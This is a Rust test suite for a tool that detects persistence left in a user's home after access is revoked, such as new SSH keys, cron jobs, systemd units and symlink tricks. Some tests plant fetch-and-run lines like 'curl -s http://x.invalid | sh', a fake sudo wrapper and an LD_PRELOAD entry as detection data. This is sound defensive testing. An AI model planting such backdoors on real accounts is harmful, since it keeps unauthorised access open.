//! D356: grant-time records and revoke-time reports of access files, with
//! J322's planted cases (#355 82768): a reboot, a retargeted symlinked
//! startup file, an edited unit target, a big file, a file flood, and a
//! rootless forgery.
use super::*;

/// A fake account whose home is a fresh private directory.
fn account() -> (User, PathBuf) {
    let mut user = User::from_uid(nix::unistd::Uid::effective())
        .unwrap()
        .unwrap();
    let home = nix::unistd::mkdtemp("/tmp/af-XXXXXX").unwrap();
    user.dir.clone_from(&home);
    (user, home)
}

/// No host spool sources, so a test reads only files beneath the fake home.
fn no_extra(_: &User, _: &mut dyn FnMut(String, io::Result<Vec<u8>>)) {}

/// Nothing known about the account beyond its files: not shared, nothing
/// left running, not privileged.
fn no_facts(_: u32) -> Facts {
    Facts::default()
}

/// The account itself for its uid, as the host's user database would.
fn lookup(user: &User) -> impl Fn(u32) -> Option<User> + '_ {
    move |uid| (uid == user.uid.as_raw()).then(|| user.clone())
}

/// Records a grant for a new person, then reports since it (root rules).
struct Granted {
    user: User,
    home: PathBuf,
    store: PathBuf,
    person: uuid::Uuid,
}
impl Granted {
    /// Grants a new person on a fresh account after `setup` ran in its home.
    fn new(setup: impl FnOnce(&Path), extra: &Extra) -> Self {
        let (user, home) = account();
        setup(&home);
        let store = home.join(".test-store");
        let person = uuid::Uuid::new_v4();
        record_grant(&store, person, &user, extra).unwrap();
        Self {
            user,
            home,
            store,
            person,
        }
    }
    /// The report a root agent gives on revoke, with no live login known
    /// (as after a reboot).
    fn report(&self, extra: &Extra) -> Access {
        since_grant(
            &self.store,
            self.person,
            &[],
            &lookup(&self.user),
            &no_facts,
            extra,
            false,
        )
    }
    /// The report with `facts` about the account.
    fn report_with(&self, facts: Facts) -> Access {
        since_grant(
            &self.store,
            self.person,
            &[],
            &lookup(&self.user),
            &move |_| facts.clone(),
            &no_extra,
            false,
        )
    }
    /// The one account's changed files.
    fn files(&self, extra: &Extra) -> Vec<Change> {
        let access = self.report(extra);
        assert_eq!(access.accounts.len(), 1, "{access:?}");
        access.accounts[0].files.clone()
    }
}
impl Drop for Granted {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.home);
    }
}

/// A key appended to `authorized_keys` and a new autostart entry are
/// reported with exactly their new lines; untouched files are not; before
/// any change the account reads "checked, unchanged".
#[test]
fn new_access_lines_since_the_grant_are_reported_exactly() {
    let granted = Granted::new(
        |home| {
            std::fs::create_dir_all(home.join(".ssh")).unwrap();
            std::fs::write(
                home.join(".ssh/authorized_keys"),
                "ssh-ed25519 AAAAold owner\n",
            )
            .unwrap();
            std::fs::write(home.join(".bashrc"), "export PATH=$PATH:~/bin\n").unwrap();
        },
        &no_extra,
    );
    let clean = granted.report(&no_extra);
    let clean_state = if cfg!(target_os = "macos") {
        State::NotChecked
    } else {
        State::Unchanged
    };
    assert_eq!(clean.state, clean_state, "{clean:?}");
    assert_eq!(clean.accounts[0].state, clean_state);
    let home = &granted.home;
    std::fs::write(
        home.join(".ssh/authorized_keys"),
        "ssh-ed25519 AAAAold owner\nssh-ed25519 AAAAnew left-behind\n",
    )
    .unwrap();
    std::fs::create_dir_all(home.join(".config/autostart")).unwrap();
    std::fs::write(
        home.join(".config/autostart/back.desktop"),
        "[Desktop Entry]\nExec=/tmp/back\n",
    )
    .unwrap();
    let access = granted.report(&no_extra);
    assert_eq!(access.state, State::Changed);
    assert_eq!(
        access.accounts[0].files,
        [
            Change {
                path: "~/.ssh/authorized_keys".into(),
                change: ChangeKind::Changed,
                lines: vec!["ssh-ed25519 AAAAnew left-behind".into()],
                note: None
            },
            Change {
                path: "~/.config/autostart/back.desktop".into(),
                change: ChangeKind::Added,
                lines: vec!["[Desktop Entry]".into(), "Exec=/tmp/back".into()],
                note: None
            },
        ]
    );
    assert_eq!(access.accounts[0].account, granted.user.name);
}

/// J322 P1: a reboot empties `/run`, so the revoke knows no live login; the
/// accounts come from the persistent record store and the plant is reported.
#[test]
fn a_revoke_after_a_reboot_still_reports_the_plant() {
    let granted = Granted::new(|_| {}, &no_extra);
    std::fs::create_dir_all(granted.home.join(".ssh")).unwrap();
    std::fs::write(
        granted.home.join(".ssh/authorized_keys"),
        "ssh-ed25519 AAAAreboot left-behind\n",
    )
    .unwrap();
    let access = granted.report(&no_extra);
    assert_eq!(access.state, State::Changed, "{access:?}");
    assert_eq!(
        access.accounts[0].files[0].lines,
        ["ssh-ed25519 AAAAreboot left-behind"]
    );
}

/// J322 P2: a symlinked startup file (home-manager style) retargeted to a
/// file in the home is reported as a retarget, and the new target's lines
/// are shown; nothing outside the home is followed.
#[test]
fn a_retargeted_symlinked_startup_file_is_reported() {
    let granted = Granted::new(
        |home| std::os::unix::fs::symlink("/etc/skel/.bashrc", home.join(".bashrc")).unwrap(),
        &no_extra,
    );
    std::fs::remove_file(granted.home.join(".bashrc")).unwrap();
    std::fs::write(
        granted.home.join(".evilrc"),
        "curl -s http://x.invalid | sh\n",
    )
    .unwrap();
    std::os::unix::fs::symlink(".evilrc", granted.home.join(".bashrc")).unwrap();
    let files = granted.files(&no_extra);
    let bashrc = files.iter().find(|f| f.path == "~/.bashrc").unwrap();
    assert_eq!(bashrc.change, ChangeKind::Changed);
    assert!(
        bashrc
            .note
            .as_deref()
            .is_some_and(|note| note.contains("now points to .evilrc (was /etc/skel/.bashrc)")),
        "{bashrc:?}"
    );
    let target = files.iter().find(|f| f.path == "~/.evilrc").unwrap();
    assert_eq!(target.lines, ["curl -s http://x.invalid | sh"]);
}

/// J322 P2: a unit linked into `~/.config/systemd/user` from elsewhere in
/// the home is checked at its real file, so an added `ExecStartPost=` there
/// is reported. A drop-in directory is read too.
#[test]
fn an_edited_unit_target_and_a_drop_in_are_reported() {
    let granted = Granted::new(
        |home| {
            let share = home.join(".local/share/systemd/user");
            std::fs::create_dir_all(&share).unwrap();
            std::fs::write(
                share.join("back.service"),
                "[Service]\nExecStart=/bin/true\n",
            )
            .unwrap();
            let units = home.join(".config/systemd/user");
            std::fs::create_dir_all(&units).unwrap();
            std::os::unix::fs::symlink(
                home.join(".local/share/systemd/user/back.service"),
                units.join("back.service"),
            )
            .unwrap();
        },
        &no_extra,
    );
    let home = &granted.home;
    std::fs::write(
        home.join(".local/share/systemd/user/back.service"),
        "[Service]\nExecStart=/bin/true\nExecStartPost=/tmp/evil\n",
    )
    .unwrap();
    let dropin = home.join(".config/systemd/user/other.service.d");
    std::fs::create_dir_all(&dropin).unwrap();
    std::fs::write(
        dropin.join("x.conf"),
        "[Service]\nExecStartPre=/tmp/evil2\n",
    )
    .unwrap();
    let files = granted.files(&no_extra);
    let target = files
        .iter()
        .find(|f| f.path == "~/.local/share/systemd/user/back.service")
        .unwrap_or_else(|| panic!("{files:?}"));
    assert_eq!(target.lines, ["ExecStartPost=/tmp/evil"]);
    let drop = files
        .iter()
        .find(|f| f.path == "~/.config/systemd/user/other.service.d/x.conf")
        .unwrap_or_else(|| panic!("{files:?}"));
    assert!(drop.lines.contains(&"ExecStartPre=/tmp/evil2".to_owned()));
}

/// J322 P2: a startup file already larger than the line limit at the grant,
/// with a line appended later, is reported as changed with its size.
#[test]
fn a_big_file_changed_past_its_start_is_reported() {
    let big = "# filler line\n".repeat(8 * 1024);
    let granted = Granted::new(
        |home| std::fs::write(home.join(".zlogin"), &big).unwrap(),
        &no_extra,
    );
    std::fs::write(
        granted.home.join(".zlogin"),
        format!("{big}curl -s http://x.invalid | sh\n"),
    )
    .unwrap();
    let files = granted.files(&no_extra);
    assert_eq!(files.len(), 1, "{files:?}");
    assert_eq!(files[0].path, "~/.zlogin");
    assert_eq!(files[0].change, ChangeKind::Changed);
    assert!(
        files[0]
            .note
            .as_deref()
            .is_some_and(|note| note.contains("too large to show lines")),
        "{files:?}"
    );
}

/// J322 P2: a rootless agent runs as the account, so a person can rewrite
/// the record to match their plant. Rootless reports are never "unchanged":
/// they read "not checked: unverified", with what was found as a hint.
#[test]
fn a_rootless_record_is_never_vouched_for() {
    let granted = Granted::new(|_| {}, &no_extra);
    std::fs::write(
        granted.home.join(".bashrc"),
        "curl -s http://x.invalid | sh\n",
    )
    .unwrap();
    // The forgery: the person records again over the grant, plant included.
    let path = record_path(&granted.store, granted.person, granted.user.uid.as_raw());
    std::fs::remove_file(&path).unwrap();
    record_grant(&granted.store, granted.person, &granted.user, &no_extra).unwrap();
    let access = since_grant(
        &granted.store,
        granted.person,
        &[granted.user.uid.as_raw()],
        &lookup(&granted.user),
        &no_facts,
        &no_extra,
        true,
    );
    assert_eq!(access.state, State::NotChecked);
    assert_eq!(access.reason, Some(Reason::RootlessUnverified));
    assert_eq!(access.accounts[0].reason, Some(Reason::RootlessUnverified));
}

/// No record says "not checked", never "unchanged": with a live login and
/// no record, and with neither.
#[test]
fn a_missing_record_reads_not_checked() {
    let (user, home) = account();
    let store = home.join(".test-store");
    let person = uuid::Uuid::new_v4();
    let live = since_grant(
        &store,
        person,
        &[user.uid.as_raw()],
        &lookup(&user),
        &no_facts,
        &no_extra,
        false,
    );
    assert_eq!(live.state, State::NotChecked);
    assert_eq!(live.accounts[0].reason, Some(Reason::RecordMissing));
    assert_eq!(live.accounts[0].account, user.name);
    // A different person: the first call kept its report for a retry.
    let none = since_grant(
        &store,
        uuid::Uuid::new_v4(),
        &[],
        &lookup(&user),
        &no_facts,
        &no_extra,
        false,
    );
    assert_eq!(none.state, State::NotChecked);
    assert_eq!(none.reason, Some(Reason::RecordMissing));
    assert_eq!(none.accounts, []);
    std::fs::remove_dir_all(home).unwrap();
}

/// The record holds hashes, never lines (no secrets at rest), sits in a
/// per-account directory, and is forgotten after the revocation.
#[test]
fn the_record_holds_no_content_and_is_forgotten() {
    let granted = Granted::new(
        |home| std::fs::write(home.join(".bashrc"), "export TOKEN=secret-canary\n").unwrap(),
        &no_extra,
    );
    let path = record_path(&granted.store, granted.person, granted.user.uid.as_raw());
    let saved = std::fs::read_to_string(&path).unwrap();
    assert!(!saved.contains("secret-canary"), "the record stored a line");
    assert!(path.starts_with(granted.store.join(granted.user.uid.as_raw().to_string())));
    forget(&granted.store, granted.person).unwrap();
    assert!(!path.exists());
    assert!(
        !path.parent().unwrap().exists(),
        "an empty account directory was left"
    );
}

/// A planted link is reported with its target and never read, at a file
/// and at a directory (`~/.config/autostart` -> `/etc/xdg/autostart`).
#[test]
fn planted_links_are_reported_but_never_followed() {
    let granted = Granted::new(|_| {}, &no_extra);
    std::os::unix::fs::symlink("/etc/passwd", granted.home.join(".profile")).unwrap();
    std::fs::create_dir_all(granted.home.join(".config")).unwrap();
    std::os::unix::fs::symlink("/etc/xdg/autostart", granted.home.join(".config/autostart"))
        .unwrap();
    let files = granted.files(&no_extra);
    let notes: Vec<_> = files
        .iter()
        .map(|f| {
            (
                f.path.as_str(),
                f.note.clone().unwrap_or_default(),
                f.lines.len(),
            )
        })
        .collect();
    assert!(
        notes.contains(&(
            "~/.profile",
            "a symbolic link to /etc/passwd; not followed".to_owned(),
            0
        )),
        "{notes:?}"
    );
    assert!(
        notes.contains(&(
            "~/.config/autostart",
            "a symbolic link to /etc/xdg/autostart; not followed".to_owned(),
            0
        )),
        "{notes:?}"
    );
}

/// A planted file name carrying terminal escapes is reported printable
/// (J322's `\x1b]0;PWNED\x07…red.fish` in fish's conf.d).
#[test]
fn a_file_name_with_escapes_is_reported_printable() {
    let granted = Granted::new(|_| {}, &no_extra);
    let dir = granted.home.join(".config/fish/conf.d");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("\x1b]0;PWNED\x07\x1b[31mred.fish"),
        "curl x | sh\n",
    )
    .unwrap();
    let files = granted.files(&no_extra);
    let text = format!("{files:?}");
    assert!(!text.contains('\x1b') && !text.contains('\x07'), "{text}");
    assert!(
        files
            .iter()
            .any(|f| f.path.ends_with("red.fish") && f.lines == ["curl x | sh"])
    );
}

/// Crontab lines and an `at` job's command are reported; the environment
/// atd saved in the job (which can hold tokens) never is (J322 P3).
#[test]
fn crontab_lines_and_at_commands_are_reported_without_the_environment() {
    let after = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let planted = after.clone();
    let extra = move |_: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
        let mut crontab = b"0 * * * * backup\n".to_vec();
        if planted.load(std::sync::atomic::Ordering::SeqCst) {
            crontab.extend_from_slice(b"@reboot /tmp/back\n");
            visit(
                "at job a0000101".into(),
                Ok(b"#!/bin/sh\n# atrun uid=1000 gid=1000\numask 22\nGITHUB_TOKEN=token-canary; export GITHUB_TOKEN\ncd /home/x || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n/tmp/back --later\n".to_vec()),
            );
        }
        visit("crontab".into(), Ok(crontab));
    };
    let granted = Granted::new(|_| {}, &extra);
    after.store(true, std::sync::atomic::Ordering::SeqCst);
    let files = granted.files(&extra);
    let text = format!("{files:?}");
    assert!(
        !text.contains("token-canary"),
        "an at job's environment was reported: {text}"
    );
    let crontab = files.iter().find(|f| f.path == "crontab").unwrap();
    assert_eq!(crontab.lines, ["@reboot /tmp/back"]);
    let job = files.iter().find(|f| f.path == "at job a0000101").unwrap();
    assert_eq!(job.lines, ["/tmp/back --later"]);
}

/// A long line keeps its end, and says it was cut; a whitespace run that
/// pushes a command out of sight is counted instead (J322 P3).
#[test]
fn a_cut_line_says_so_and_keeps_its_end() {
    let hidden = format!("#{}; curl -s http://x.invalid | sh", " ".repeat(230));
    assert_eq!(
        shown(hidden.as_bytes()),
        "#[230 spaces]; curl -s http://x.invalid | sh"
    );
    let long = format!("{}; curl -s http://x.invalid | sh", "x".repeat(500));
    let cut = shown(long.as_bytes());
    assert!(cut.contains("characters cut]"), "{cut}");
    assert!(cut.ends_with("curl -s http://x.invalid | sh"), "{cut}");
    assert!(shown(b"a\x1b[2Jb").contains('\u{fffd}'));
}

/// The report shows at most `REPORTED_LINES` lines and says when it held
/// more back, without dropping the file.
#[test]
fn the_report_is_bounded_and_says_so() {
    let granted = Granted::new(|_| {}, &no_extra);
    let many: String = (0..REPORTED_LINES * 2)
        .map(|i| ["alias a", &i.to_string(), "=b\n"].concat())
        .collect();
    std::fs::write(granted.home.join(".zshrc"), many).unwrap();
    let access = granted.report(&no_extra);
    let account = &access.accounts[0];
    assert!(account.truncated);
    assert_eq!(account.files[0].lines.len(), REPORTED_LINES);
    assert!(
        account.files[0]
            .note
            .as_deref()
            .is_some_and(|note| note.contains("more new lines")),
    );
}

/// J322 P2, the flood: 64 drop-in directories of 64 files of 64 KiB each.
/// Run in a child so its peak memory is its own: it stays under 40 MB, the
/// report says it is truncated and names what it did not scan, and the
/// crontab (scanned before the unit directory) is still reported.
#[test]
fn a_file_flood_stays_bounded_and_keeps_the_crontab() {
    let output = std::process::Command::new(std::env::current_exe().unwrap())
        .args([
            "--exact",
            "access_files::tests::flood_probe",
            "--ignored",
            "--nocapture",
            "--test-threads=1",
        ])
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        output.status.success(),
        "{stdout}{}",
        String::from_utf8_lossy(&output.stderr)
    );
    // The harness prints the test's name on the same line as its output.
    let line = stdout
        .lines()
        .find_map(|line| line.find("FLOOD ").map(|at| &line[at..]))
        .unwrap_or_else(|| panic!("{stdout}"));
    let peak_kb: u64 = line
        .split_whitespace()
        .find_map(|field| field.strip_prefix("peak_kb="))
        .unwrap()
        .parse()
        .unwrap();
    eprintln!("{line}");
    assert!(peak_kb < 40 * 1024, "peak {peak_kb} kB");
    assert!(line.contains("truncated=true"), "{line}");
    assert!(line.contains("crontab_reported=true"), "{line}");
    assert!(
        line.contains("unscanned=") && !line.contains("unscanned=0 "),
        "{line}"
    );
}

/// Child of `a_file_flood_stays_bounded_and_keeps_the_crontab`.
#[test]
#[ignore = "child of a_file_flood_stays_bounded_and_keeps_the_crontab"]
fn flood_probe() {
    let after = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let planted = after.clone();
    let extra = move |_: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
        let mut crontab = b"0 * * * * backup\n".to_vec();
        if planted.load(std::sync::atomic::Ordering::SeqCst) {
            crontab.extend_from_slice(b"@reboot /tmp/back\n");
        }
        visit("crontab".into(), Ok(crontab));
    };
    let granted = Granted::new(|_| {}, &extra);
    let chunk = "x".repeat(64 * 1024 - 1) + "\n";
    for directory in 0..64 {
        let path = granted
            .home
            .join(format!(".config/systemd/user/u{directory}.service.d"));
        std::fs::create_dir_all(&path).unwrap();
        for file in 0..64 {
            std::fs::write(path.join(format!("f{file}.conf")), &chunk).unwrap();
        }
    }
    after.store(true, std::sync::atomic::Ordering::SeqCst);
    let access = granted.report(&extra);
    let account = &access.accounts[0];
    let crontab = account
        .files
        .iter()
        .any(|f| f.path == "crontab" && f.lines == ["@reboot /tmp/back"]);
    let status = std::fs::read_to_string("/proc/self/status").unwrap();
    let peak = status
        .lines()
        .find_map(|line| line.strip_prefix("VmHWM:"))
        .unwrap()
        .trim()
        .trim_end_matches(" kB")
        .to_owned();
    println!(
        "FLOOD peak_kb={peak} truncated={} crontab_reported={crontab} unscanned={} files={}",
        account.truncated,
        account.unscanned.len(),
        account.files.len()
    );
}

/// Each watched place in [`WATCHED`] is detected: a file planted there after
/// the grant is reported (one test for the whole table, so a place added to
/// the table is covered by adding it there).
#[test]
fn every_watched_place_is_detected() {
    let planted = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let spool = planted.clone();
    let extra = move |account: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
        let planted = spool.load(std::sync::atomic::Ordering::SeqCst);
        visit(
            "sshd effective configuration".into(),
            Ok(b"authorizedkeysfile .ssh/effective-keys\n".to_vec()),
        );
        if planted {
            visit("crontab".into(), Ok(b"@reboot /tmp/back\n".to_vec()));
        }
        for place in WATCHED.iter().filter(|p| p.watch == Watch::AtSpool) {
            at_spool(
                account,
                &account.dir.join(place.path.trim_start_matches('/')),
                visit,
            );
        }
    };
    let granted = Granted::new(|_| {}, &extra);
    for place in WATCHED {
        let path = granted.home.join(place.path);
        match place.watch {
            Watch::File => {
                std::fs::create_dir_all(path.parent().unwrap()).unwrap();
                std::fs::write(&path, format!("planted in {}\n", place.path)).unwrap();
            }
            Watch::Directory | Watch::Units => {
                std::fs::create_dir_all(&path).unwrap();
                std::fs::write(
                    path.join("planted.conf"),
                    format!("planted in {}\n", place.path),
                )
                .unwrap();
            }
            Watch::Spools => {}
            Watch::AtSpool => {
                let directory = granted.home.join(place.path.trim_start_matches('/'));
                std::fs::create_dir_all(&directory).unwrap();
                std::fs::write(
                    directory.join("planted.conf"),
                    "#!/bin/sh\ncd /tmp || {\n exit 1\n}\n/tmp/back\n",
                )
                .unwrap();
            }
            Watch::Sshd => {
                std::fs::create_dir_all(granted.home.join(".ssh")).unwrap();
                std::fs::write(
                    granted.home.join(".ssh/effective-keys"),
                    "ssh-ed25519 AAAAplant\n",
                )
                .unwrap();
            }
        }
    }
    planted.store(true, std::sync::atomic::Ordering::SeqCst);
    let files = granted.files(&extra);
    for place in WATCHED {
        let found = match place.watch {
            Watch::Spools => files.iter().any(|f| f.path == "crontab"),
            Watch::AtSpool => files
                .iter()
                .any(|f| f.path.ends_with(&format!("{}/planted.conf", place.path))),
            Watch::Sshd => files.iter().any(|f| f.path == "~/.ssh/effective-keys"),
            Watch::File => files.iter().any(|f| f.path == format!("~/{}", place.path)),
            Watch::Directory | Watch::Units => files
                .iter()
                .any(|f| f.path == format!("~/{}/planted.conf", place.path)),
        };
        assert!(
            found,
            "{} ({}) was not detected: {files:?}",
            place.path, place.category
        );
    }
}

/// J334 P1-2: the four places the scan did not look at: a unit enabled from
/// `~/.local/share/systemd/user`, `environment.d`, `~/.bash_aliases`, and a
/// program shadowing `sudo` in `~/.local/bin`.
#[test]
fn the_four_places_j334_found_unscanned_are_reported() {
    let granted = Granted::new(|_| {}, &no_extra);
    let home = &granted.home;
    let share = home.join(".local/share/systemd/user");
    std::fs::create_dir_all(share.join("default.target.wants")).unwrap();
    std::fs::write(
        share.join("j334back.service"),
        "[Service]\nExecStart=/tmp/back\n",
    )
    .unwrap();
    std::os::unix::fs::symlink(
        "../j334back.service",
        share.join("default.target.wants/j334back.service"),
    )
    .unwrap();
    std::fs::create_dir_all(home.join(".config/environment.d")).unwrap();
    std::fs::write(
        home.join(".config/environment.d/50-j334.conf"),
        "LD_PRELOAD=/tmp/x.so\n",
    )
    .unwrap();
    std::fs::write(home.join(".bash_aliases"), "alias ls='curl x | sh'\n").unwrap();
    std::fs::create_dir_all(home.join(".local/bin")).unwrap();
    std::fs::write(home.join(".local/bin/sudo"), "#!/bin/sh\ncurl x | sh\n").unwrap();
    let paths: Vec<String> = granted
        .files(&no_extra)
        .into_iter()
        .map(|f| f.path)
        .collect();
    for expected in [
        "~/.local/share/systemd/user/j334back.service",
        "~/.local/share/systemd/user/default.target.wants/j334back.service",
        "~/.config/environment.d/50-j334.conf",
        "~/.bash_aliases",
        "~/.local/bin/sudo",
    ] {
        assert!(
            paths.iter().any(|p| p == expected),
            "{expected} missing: {paths:?}"
        );
    }
}

/// J334 P1-1: a unit directory with more than 1024 names is not scanned, so
/// the account is "not checked: incomplete", never "unchanged".
#[test]
fn a_directory_too_big_to_scan_is_never_unchanged() {
    let granted = Granted::new(|_| {}, &no_extra);
    let units = granted.home.join(".config/systemd/user");
    std::fs::create_dir_all(&units).unwrap();
    for index in 0..1100 {
        std::fs::write(units.join(format!("pad{index}.conf")), "").unwrap();
    }
    std::fs::write(
        units.join("j334big.service"),
        "[Service]\nExecStart=/tmp/back\n",
    )
    .unwrap();
    let access = granted.report(&no_extra);
    let account = &access.accounts[0];
    assert_eq!(account.state, State::NotChecked, "{account:?}");
    assert_eq!(account.reason, Some(Reason::Incomplete));
    assert!(
        account
            .unscanned
            .iter()
            .any(|name| name.contains("more than 1024 entries"))
    );
    assert_eq!(access.state, State::NotChecked);
}

/// J334 P3: a tree of many drop-in directories costs walks, not entries;
/// past the directory bound the account is incomplete.
#[test]
fn too_many_directories_make_the_account_incomplete() {
    let granted = Granted::new(|_| {}, &no_extra);
    let units = granted.home.join(".config/systemd/user");
    for index in 0..300 {
        std::fs::create_dir_all(units.join(format!("u{index}.service.d"))).unwrap();
    }
    let account = &granted.report(&no_extra).accounts[0];
    assert_eq!(account.reason, Some(Reason::Incomplete), "{account:?}");
}

/// J334 P2-4: `~/.ssh` kept as a link into the home (a dotfile manager's
/// layout) is resolved inside the home, so a key added through it is shown.
#[test]
fn a_key_behind_a_symlinked_ssh_directory_is_reported() {
    let granted = Granted::new(
        |home| {
            std::fs::create_dir_all(home.join(".dotfiles/ssh")).unwrap();
            std::fs::write(
                home.join(".dotfiles/ssh/authorized_keys"),
                "ssh-ed25519 AAAAowner o\n",
            )
            .unwrap();
            std::os::unix::fs::symlink(".dotfiles/ssh", home.join(".ssh")).unwrap();
        },
        &no_extra,
    );
    std::fs::write(
        granted.home.join(".dotfiles/ssh/authorized_keys"),
        "ssh-ed25519 AAAAowner o\nssh-ed25519 AAAAj334 left\n",
    )
    .unwrap();
    let files = granted.files(&no_extra);
    let keys = files
        .iter()
        .find(|f| f.path == "~/.ssh/authorized_keys")
        .unwrap_or_else(|| panic!("{files:?}"));
    assert_eq!(keys.lines, ["ssh-ed25519 AAAAj334 left"]);
}

/// A link among the directories that leaves the home is not followed, and
/// the account is incomplete, never "unchanged".
#[test]
fn a_directory_link_leaving_the_home_makes_the_account_incomplete() {
    let granted = Granted::new(
        |home| std::os::unix::fs::symlink("/etc", home.join(".ssh")).unwrap(),
        &no_extra,
    );
    let account = &granted.report(&no_extra).accounts[0];
    assert_eq!(account.reason, Some(Reason::Incomplete), "{account:?}");
    assert!(
        account
            .unscanned
            .iter()
            .any(|name| name.contains("leaves the home"))
    );
}

/// J334 P2-3: a file there at the grant and gone now (the owner's mask that
/// kept a unit off) is reported as removed.
#[test]
fn a_removed_mask_is_reported() {
    let granted = Granted::new(
        |home| {
            let units = home.join(".config/systemd/user");
            std::fs::create_dir_all(&units).unwrap();
            std::os::unix::fs::symlink("/dev/null", units.join("j334masked.service")).unwrap();
        },
        &no_extra,
    );
    std::fs::remove_file(granted.home.join(".config/systemd/user/j334masked.service")).unwrap();
    let files = granted.files(&no_extra);
    assert_eq!(files.len(), 1, "{files:?}");
    assert_eq!(files[0].path, "~/.config/systemd/user/j334masked.service");
    assert_eq!(files[0].change, ChangeKind::Removed);
}

/// J334 P2-1 and P1-4: an account shared with others, whose programs may
/// still run, or a privileged one, is never "unchanged"; listed files still
/// read "changed".
#[test]
fn shared_or_privileged_accounts_are_never_unchanged() {
    let granted = Granted::new(|_| {}, &no_extra);
    let shared = granted.report_with(Facts {
        shared: true,
        programs_may_remain: true,
        privileged: false,
        processes: Vec::new(),
    });
    assert_eq!(shared.accounts[0].reason, Some(Reason::ProgramsMayRemain));
    assert!(shared.accounts[0].shared);
    let privileged = granted.report_with(Facts {
        shared: false,
        programs_may_remain: false,
        privileged: true,
        processes: Vec::new(),
    });
    assert_eq!(privileged.accounts[0].reason, Some(Reason::Privileged));
    std::fs::write(granted.home.join(".bashrc"), "curl x | sh\n").unwrap();
    let changed = granted.report_with(Facts {
        shared: true,
        programs_may_remain: true,
        privileged: true,
        processes: Vec::new(),
    });
    assert_eq!(changed.accounts[0].state, State::NotChecked);
}

/// J334 P2-7: a failed recording leaves a marker; a later login does not
/// record over it, and the revocation says recording failed.
#[test]
fn a_failed_recording_is_never_replaced_by_a_later_login() {
    let (user, home) = account();
    let store = home.join(".test-store");
    let person = uuid::Uuid::new_v4();
    // The account's directory in the store is a file, so the record cannot
    // be written there; the failure marker goes to the store's root.
    std::fs::create_dir_all(&store).unwrap();
    std::fs::write(store.join(user.uid.as_raw().to_string()), "").unwrap();
    assert!(record_grant(&store, person, &user, &no_extra).is_err());
    std::fs::write(home.join(".bashrc"), "curl x | sh\n").unwrap();
    assert!(record_grant(&store, person, &user, &no_extra).is_ok());
    let access = since_grant(
        &store,
        person,
        &[],
        &lookup(&user),
        &no_facts,
        &no_extra,
        false,
    );
    assert_eq!(
        access.accounts[0].reason,
        Some(Reason::RecordFailed),
        "{access:?}"
    );
    std::fs::remove_dir_all(home).unwrap();
}

/// J334 P2-2: a retried revocation, after the records were forgotten, sends
/// the last report again instead of "no record".
#[test]
fn a_retry_sends_the_last_report_again() {
    let granted = Granted::new(|_| {}, &no_extra);
    std::fs::write(granted.home.join(".bashrc"), "curl x | sh\n").unwrap();
    let first = granted.report(&no_extra);
    forget(&granted.store, granted.person).unwrap();
    let retry = since_grant(
        &granted.store,
        granted.person,
        &[granted.user.uid.as_raw()],
        &lookup(&granted.user),
        &no_facts,
        &no_extra,
        false,
    );
    assert_eq!(retry, first);
    assert_eq!(retry.state, State::Changed);
}

/// Each report says when its baseline was recorded and when it was
/// scanned, how many places it checked and their categories (D360).
#[test]
fn a_report_carries_its_baseline_time() {
    let granted = Granted::new(
        |home| std::fs::write(home.join(".bashrc"), "export PATH=$PATH:~/bin\n").unwrap(),
        &no_extra,
    );
    let account = &granted.report(&no_extra).accounts[0];
    assert!(account.recorded_at > 0 && account.scanned_at >= account.recorded_at);
    assert_eq!(
        account.watched,
        if cfg!(target_os = "macos") {
            0
        } else {
            WATCHED.len()
        }
    );
    assert_eq!(account.places, 1, "one file was there to check");
    assert!(account.complete);
    // D360: the report names what it watched.
    assert_eq!(
        account.categories,
        [
            "SSH keys",
            "cron and at jobs",
            "user services",
            "SSH settings",
            "shell startup files",
            "desktop autostart",
            "programs on PATH"
        ]
    );
}

/// J334 P2-1, the second person: the account was shared when the first
/// person's access ended, so a key their program wrote afterwards shows up
/// in the second person's report marked as a shared account (it may not
/// be theirs).
#[test]
fn a_later_report_on_a_shared_account_says_it_was_shared() {
    let (user, home) = account();
    let store = home.join(".test-store");
    let (first, second) = (uuid::Uuid::new_v4(), uuid::Uuid::new_v4());
    record_grant(&store, first, &user, &no_extra).unwrap();
    record_grant(&store, second, &user, &no_extra).unwrap();
    let uid = user.uid.as_raw();
    let shared = |_: u32| Facts {
        shared: true,
        programs_may_remain: true,
        privileged: false,
        processes: Vec::new(),
    };
    let early = since_grant(
        &store,
        first,
        &[uid],
        &lookup(&user),
        &shared,
        &no_extra,
        false,
    );
    assert_eq!(early.accounts[0].reason, Some(Reason::ProgramsMayRemain));
    forget(&store, first).unwrap();
    // The first person's program writes after their revocation.
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::write(
        home.join(".ssh/authorized_keys"),
        "ssh-ed25519 AAAAlate late\n",
    )
    .unwrap();
    let later = since_grant(
        &store,
        second,
        &[uid],
        &lookup(&user),
        &no_facts,
        &no_extra,
        false,
    );
    assert_eq!(later.accounts[0].state, State::Changed);
    assert!(
        later.accounts[0].shared,
        "the later report hid that the account was shared"
    );
    forget(&store, second).unwrap();
    assert!(
        !store.join(uid.to_string()).exists(),
        "the shared marker outlived the account's records"
    );
    std::fs::remove_dir_all(home).unwrap();
}

/// J343: final directory links inside the home must expose planted files.
#[test]
fn watched_directory_links_are_scanned_to_the_end() {
    for place in [".local/bin", ".config/systemd/user"] {
        let granted = Granted::new(
            |home| {
                std::fs::create_dir_all(home.join(".dotfiles/real")).unwrap();
                std::fs::create_dir_all(home.join(place).parent().unwrap()).unwrap();
                std::os::unix::fs::symlink(home.join(".dotfiles/real"), home.join(place)).unwrap();
            },
            &no_extra,
        );
        std::fs::write(
            granted.home.join(place).join("back.service"),
            "ExecStart=/tmp/plant\n",
        )
        .unwrap();
        let report = granted.report(&no_extra);
        assert_eq!(report.state, State::Changed, "{place}: {report:?}");
        assert!(
            report.accounts[0]
                .files
                .iter()
                .any(|f| f.lines.iter().any(|l| l.contains("plant")))
        );
    }
}

